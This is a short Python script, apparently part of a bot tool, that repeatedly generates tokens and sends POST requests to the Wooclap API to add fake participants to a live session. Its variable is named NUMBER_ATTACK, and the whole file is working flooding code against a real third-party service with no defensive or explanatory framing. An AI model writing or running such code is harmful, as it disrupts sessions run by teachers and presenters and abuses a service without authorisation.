from components.core import generate_token
import http.client

# Send bot to display several persons into session

def add_users(WOOCLAP_ID, NUMBER_ATTACK):
    for _ in range(int(NUMBER_ATTACK)):
        token = generate_token()

        conn = http.client.HTTPSConnection("app.wooclap.com")
        payload = ''
        headers = {
            'Authorization': 'Bearer '+token
        }
        conn.request("POST", "/api/user?slug="+WOOCLAP_ID, payload, headers)